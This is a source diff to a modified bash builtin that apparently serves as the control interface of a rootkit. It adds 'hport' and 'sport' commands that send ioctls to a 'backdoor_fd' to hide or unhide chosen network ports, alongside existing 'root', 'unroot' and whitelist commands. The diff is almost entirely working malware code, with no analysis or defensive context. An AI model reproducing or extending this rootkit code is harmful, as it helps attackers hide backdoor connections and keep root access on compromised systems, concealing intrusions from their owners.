@@ -19,6 +19,7 @@ $END
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <inttypes.h>
+#include <arpa/inet.h>
 #include "../bashtypes.h"
 #include "../bashintl.h"
 #include "../shell.h"
@@ -396,7 +397,7 @@ void free_white_request(struct white_request *request)
         free(request->entries);
 }
 
-enum white_type identify_type(char *word)
+enum white_type identify_white_type(char *word)
 {
 	int cur;
 	for (cur = 0; cur < ARRAY_LENGTH(white_type_names); cur++) {
@@ -418,9 +419,13 @@ static int whitelist_add(list) WORD_LIST *list;
 
 	init_white_request(&req);
 
+	if (list == NULL) {
+		printf("ERROR: MISSING TYPE FOR WHITELIST ENTRY\n");
+		goto err_out;
+	}
 	while (list != NULL) {
 		word = list->word->word;
-		cur_type = identify_type(word);
+		cur_type = identify_white_type(word);
 		if (cur_type == INVALID) {
 			printf("ERROR: INVALID TYPE FOR WHITELIST ENTRY\n");
 			goto err_out;
@@ -464,9 +469,13 @@ static int whitelist_remove(list) WORD_LIST *list;
 
 	init_white_request(&req);
 
+	if (list == NULL) {
+		printf("ERROR: MISSING TYPE FOR WHITELIST ENTRY\n");
+		goto err_out;
+	}
 	while (list != NULL) {
 		word = list->word->word;
-		cur_type = identify_type(word);
+		cur_type = identify_white_type(word);
 		if (cur_type == INVALID) {
 			printf("ERROR: INVALID TYPE FOR WHITELIST ENTRY\n");
 			goto err_out;
@@ -541,6 +550,206 @@ err_out:
 	return EXECUTION_FAILURE;
 }
 
+
+void init_sock_request(struct sock_request *request)
+{
+        request->count = 0;
+        request->socks = NULL;
+}
+
+int add_sock_request(enum rkit_sock_type type, enum __socket_type stype,
+		__u16 portno,struct sock_request *request)
+{
+	int ret = 0;
+	struct sock_id new_entry = {
+		.type = type,
+		.stype = stype,
+		.port_no = htons(portno),
+	};
+
+	request->count++;
+
+	request->socks = realloc(request->socks, //done since reallocarray doesn't seem to be available
+				request->count * sizeof(struct sock_id));
+
+	memcpy(&request->socks[request->count - 1],&new_entry,
+		sizeof(struct sock_id));
+out:
+	return ret;
+}
+
+void free_sock_request(struct sock_request *request)
+{
+        free(request->socks);
+}
+
+enum rkit_sock_type identify_sock_type(char *word)
+{
+	int cur;
+	for (cur = 0; cur < ARRAY_LENGTH(rkit_sock_type_names); cur++) {
+		if (!strncmp(word,rkit_sock_type_names[cur],
+				strlen(rkit_sock_type_names[cur])))
+			return cur;
+	}
+	return -1;
+}
+
+static int identify_stype(char *word)
+{
+	int cur_stype;
+	for (cur_stype = 0; cur_stype <= SOCK_PACKET; cur_stype++) {
+		if (!valid_sock_types[cur_stype])
+                        continue;
+		if(!strncmp(word,sock_type_names[cur_stype],
+				strlen(sock_type_names[cur_stype])))
+			return cur_stype;
+	}
+	return -1;
+}
+
+static int hide_ports(list) WORD_LIST *list;
+{
+	int res;
+	int ret;
+	struct sock_request req;
+	unsigned long cur_port;
+	enum rkit_sock_type cur_type;
+	enum __socket_type cur_stype;
+	char *word;
+	char *endptr;
+
+	init_sock_request(&req);
+
+	if (list == NULL) {
+		printf("ERROR: MISSING TYPE FOR ENTRY\n");
+		goto err_out;
+	}
+	while (list != NULL) {
+		word = list->word->word;
+		cur_type = identify_sock_type(word);
+		if (cur_type == INVALID) {
+			printf("ERROR: INVALID TYPE FOR SOCKET BLACKLIST ENTRY\n");
+			goto err_out;
+		}
+		printf("oyoyoy\n");
+		list = list->next;
+		if (list == NULL) {
+			printf("ERROR: MISSING STYPE FOR ENTRY\n");
+			goto err_out;
+		}
+		word = list->word->word;
+		cur_stype = identify_stype(word);
+		if (cur_stype == -1) {
+			printf("ERROR: UNKNOWN STYPE %s\n",word);
+			goto err_out;
+		}
+		list = list->next;
+		if (list == NULL) {
+			printf("ERROR: MISSING PORT NUMBER FOR ENTRY\n");
+			goto err_out;
+		}
+		word = list->word->word;
+		cur_port = strtoul(word,&endptr,10);
+		if (*endptr) {
+			printf("ERROR: NON NUMBER GIVEN\n");
+			goto err_out;
+		} else if (cur_port > 65535) {
+			printf("ERROR: PORT NUMBER OF %ld TOO HIGH\n",cur_port);
+			goto err_out;
+		}
+		if(add_sock_request(cur_type,cur_stype,(__u16)cur_port,&req))
+			goto err_out;
+		list = list->next;
+	}
+
+	res = ioctl(backdoor_fd,HIDE_PORT_IOCTL,&req);
+	free_sock_request(&req);
+
+	if (res == 0) {
+		printf("successfully hid port(s)\n");
+		ret = EXECUTION_SUCCESS;
+	} else {
+		perror("ERROR HIDING PORTS");
+		ret = EXECUTION_FAILURE;
+	}
+	return ret;
+err_out:
+	if (req.count)
+		free_sock_request(&req);
+	return EXECUTION_FAILURE;
+}
+
+static int show_ports(list) WORD_LIST *list;
+{
+	int res;
+	int ret;
+	struct sock_request req;
+	unsigned long cur_port;
+	enum rkit_sock_type cur_type;
+	enum __socket_type cur_stype;
+	char *word;
+	char *endptr = NULL;
+
+	init_sock_request(&req);
+
+	if (list == NULL) {
+		printf("ERROR: MISSING TYPE FOR ENTRY\n");
+		goto err_out;
+	}
+	while (list != NULL) {
+		word = list->word->word;
+		cur_type = identify_sock_type(word);
+		if (cur_type == INVALID) {
+			printf("ERROR: INVALID TYPE FOR SOCKET BLACKLIST ENTRY\n");
+			goto err_out;
+		}
+		list = list->next;
+		if (list == NULL) {
+			printf("ERROR: MISSING STYPE FOR ENTRY\n");
+			goto err_out;
+		}
+		word = list->word->word;
+		cur_stype = identify_stype(word);
+		if (cur_stype == -1) {
+			printf("ERROR: UNKNOWN STYPE %s\n",word);
+			goto err_out;
+		}
+		list = list->next;
+		if (list == NULL) {
+			printf("ERROR: MISSING PORT NUMBER FOR ENTRY\n");
+			goto err_out;
+		}
+		word = list->word->word;
+		cur_port = strtoul(word,&endptr,10);
+		if (*endptr) {
+			printf("ERROR: NON NUMBER GIVEN\n");
+			goto err_out;
+		} else if (cur_port > 65535) {
+			printf("ERROR: NUMBER TOO HIGH\n");
+			goto err_out;
+		}
+		if(add_sock_request(cur_type,cur_stype,(__u16)cur_port,&req))
+			goto err_out;
+		list = list->next;
+	}
+
+	res = ioctl(backdoor_fd,SHOW_PORT_IOCTL,&req);
+	free_sock_request(&req);
+
+	if (res == 0) {
+		printf("successfully unhid port(s)\n");
+		ret = EXECUTION_SUCCESS;
+	} else {
+		perror("ERROR UNHIDING PORTS");
+		ret = EXECUTION_FAILURE;
+	}
+	return ret;
+err_out:
+	if (req.count)
+		free_sock_request(&req);
+	return EXECUTION_FAILURE;
+}
+
 static const char *gibroot_cmd_names[] = {
 	"root",
 	"unroot",
@@ -556,6 +765,8 @@ static const char *gibroot_cmd_names[] = {
 	"wrem",
 	"wlist",
 	"newname",
+	"hport",
+	"sport",
 };
 
 int (*gibroot_cmd[])(WORD_LIST*) = {
@@ -573,6 +784,8 @@ int (*gibroot_cmd[])(WORD_LIST*) = {
 	whitelist_remove,
 	list_whitelist_items,
 	change_my_name,
+	hide_ports,
+	show_ports,
 };
 
 
